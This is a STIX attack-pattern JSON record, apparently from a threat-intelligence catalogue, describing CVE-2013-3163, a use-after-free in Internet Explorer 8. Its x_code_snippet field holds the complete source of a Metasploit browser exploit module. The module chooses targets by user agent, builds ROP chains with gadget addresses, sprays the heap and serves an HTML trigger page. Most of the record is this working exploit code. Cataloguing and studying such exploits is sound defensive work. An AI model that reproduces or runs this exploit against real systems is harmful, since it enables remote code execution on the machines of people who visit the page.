{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--abf7abad-0a4a-435f-9029-be784fc3300e",
    "created": "2024-08-14T16:42:05.438698Z",
    "modified": "2024-08-14T16:42:05.438703Z",
    "name": "\"MS13-055 Microsoft Internet Explorer CAnchorElement Use-After-Free\"",
    "description": " In IE8 standards mode, it's possible to cause a use-after-free condition by first creating an illogical table tree, where a CPhraseElement comes after CTableRow with the final node being a sub table element. When the CPhraseElement's outer content is reset by using either outerText or outerHTML through an event handler this triggers a free of its child element (in this case, a CAnchorElement, but some other objects apply too), but a reference is still kept in function SRunPointer::SpanQualifier. This function will then pass on the invalid reference to the next functions, eventually used in mshtml!CElement::Doc when it's trying to make a call to the object's SecurityContext virtual function at offset +0x70, which results a crash. An attacker can take advantage of this by first creating an CAnchorElement object, let it free, and then replace the freed memory with another fake object. Successfully doing so may allow arbitrary code execution under the context of the user.  This bug is specific to Internet Explorer 8 only. It was originally discovered by Jose Antonio Vazquez Gonzalez and reported to iDefense, but was discovered again by Orange Tsai at Hitcon 2013.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/ms13_055_canchor.rb",
            "external_id": "ms13_055_canchor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-3163"
        },
        {
            "source_name": "reference",
            "url": "https://speakerd.s3.amazonaws.com/presentations/0df98910d26c0130e8927e81ab71b214/for-share.pdf"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"MS13-055 Microsoft Internet Explorer CAnchorElement Use-After-Free\",\n      'Description'    => %q{\n        In IE8 standards mode, it's possible to cause a use-after-free condition by first\n        creating an illogical table tree, where a CPhraseElement comes after CTableRow,\n        with the final node being a sub table element. When the CPhraseElement's outer\n        content is reset by using either outerText or outerHTML through an event handler,\n        this triggers a free of its child element (in this case, a CAnchorElement, but\n        some other objects apply too), but a reference is still kept in function\n        SRunPointer::SpanQualifier. This function will then pass on the invalid reference\n        to the next functions, eventually used in mshtml!CElement::Doc when it's trying to\n        make a call to the object's SecurityContext virtual function at offset +0x70, which\n        results a crash. An attacker can take advantage of this by first creating an\n        CAnchorElement object, let it free, and then replace the freed memory with another\n        fake object. Successfully doing so may allow arbitrary code execution under the\n        context of the user.\n\n        This bug is specific to Internet Explorer 8 only. It was originally discovered by\n        Jose Antonio Vazquez Gonzalez and reported to iDefense, but was discovered again\n        by Orange Tsai at Hitcon 2013.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Jose Antonio Vazquez Gonzalez', # Original discovery reported from iDefense\n          'Orange Tsai',                   # Rediscovery, published at Hitcon 2013\n          'Peter Vreugdenhil',             # Joins the party (wtfuzz)\n          'sinn3r'                         # Joins the party\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-3163' ],\n          [ 'OSVDB', '94981' ],\n          [ 'MSB', 'MS13-055'  ],\n          [ 'URL', 'https://speakerd.s3.amazonaws.com/presentations/0df98910d26c0130e8927e81ab71b214/for-share.pdf' ]\n        ],\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Automatic', {} ],\n          [\n            'IE 8 on Windows XP SP3',\n            {\n              'Rop'   => :msvcrt,\n              'Pivot' => 0x77c15ed5, # xchg eax, esp; ret\n              'Align' => 0x77c4d801  # add esp, 0x2c; ret\n            }\n          ],\n          [\n            'IE 8 on Windows 7',\n            {\n              'Rop'   => :jre,\n              'Pivot' => 0x7c348b05, # xchg eax, esp; ret\n              'Align' => 0x7C3445F8  # add esp, 0x2c; ret\n            }\n          ]\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\"\n        },\n      'DefaultOptions' =>\n        {\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Privileged'     => false,\n      # Bug was patched in July 2013. Tsai was the first to publish the bug.\n      # But Jose already reported way back in Oct 2012 (to iDefense)\n      'DisclosureDate' => '2013-07-09',\n      'DefaultTarget'  => 0))\n  end\n\n  def get_target(agent)\n    return target if target.name != 'Automatic'\n\n    nt = agent.scan(/Windows NT (\\d\\.\\d)/).flatten[0] || ''\n    ie = agent.scan(/MSIE (\\d)/).flatten[0] || ''\n\n    ie_name = \"IE #{ie}\"\n\n    case nt\n    when '5.1'\n      os_name = 'Windows XP SP3'\n    when '6.1'\n      os_name = 'Windows 7'\n    end\n\n    targets.each do |t|\n      if (!ie.empty? and t.name.include?(ie_name)) and (!nt.empty? and t.name.include?(os_name))\n        return t\n      end\n    end\n\n    nil\n  end\n\n  def get_payload(t)\n    if t['Rop'] == :msvcrt\n      print_status(\"Using msvcrt ROP\")\n      esp_align = \"\\x81\\xc4\\x54\\xf2\\xff\\xff\"\n      rop_dll = 'msvcrt'\n      opts    = {'target'=>'xp'}\n    else\n      print_status(\"Using JRE ROP\")\n      esp_align = \"\\x81\\xEC\\xF0\\xD8\\xFF\\xFF\" # sub esp, -10000\n      rop_dll = 'java'\n      opts    = {}\n    end\n\n    p = esp_align + payload.encoded + rand_text_alpha(12000)\n    generate_rop_payload(rop_dll, p, opts)\n  end\n\n  def get_html(t, p)\n    junk       = rand_text_alpha(4).unpack(\"V\")[0].to_i\n    js_pivot   = Rex::Text.to_unescape([t['Pivot']].pack(\"V*\"))\n    js_payload = Rex::Text.to_unescape(p)\n    js_align   = Rex::Text.to_unescape([t['Align']].pack(\"V*\"))\n    js_junk    = Rex::Text.to_unescape([junk].pack(\"V*\"))\n\n    q_id = Rex::Text.rand_text_alpha(1)\n\n    %Q|\n<!DOCTYPE html>\n<HTML XMLNS:t =\"urn:schemas-microsoft-com:time\">\n  <head>\n    <meta>\n      <?IMPORT namespace=\"t\" implementation=\"#default#time2\">\n    </meta>\n  </head>\n  <script>\n    #{js_mstime_malloc}\n\n    window.onload = function() {\n      var x\t= document.getElementById(\"#{q_id}\");\n      x.outerText = \"\";\n      a = document.getElementById('myanim');\n\n      p = '';\n      for (i=0; i < 7; i++) {\n        p += unescape(\"#{js_junk}\");\n      }\n      p += unescape(\"#{js_payload}\");\n\n      fo = unescape(\"#{js_align}\");\n      for (i=0; i < 28; i++) {\n        if (i == 27) { fo += unescape(\"#{js_pivot}\"); }\n        else         { fo += unescape(\"#{js_align}\"); }\n      }\n\n      fo += p;\n\n      mstime_malloc({shellcode:fo, heapBlockSize:0x68, objId:\"myanim\"});\n    }\n  </script>\n    <table>\n    <tr>\n    <div>\n    <span>\n    <q id='#{q_id}'>\n    <a>\n    <td></td>\n    </a>\n    </q>\n    </span>\n    </div>\n    </tr>\n    </table>\n  <t:ANIMATECOLOR id=\"myanim\"/>\n</html>\n    |\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    t = get_target(agent)\n\n    if t\n      p = get_payload(t)\n      html = get_html(t, p)\n      print_status(\"Sending exploit...\")\n      send_response(cli, html, {'Content-Type'=>'text/html', 'Cache-Control'=>'no-cache'})\n    else\n      print_error(\"Not a suitable target: #{agent}\")\n      send_not_found(cli)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-07-09",
    "x_mitre_platforms": [
        "win'"
    ]
}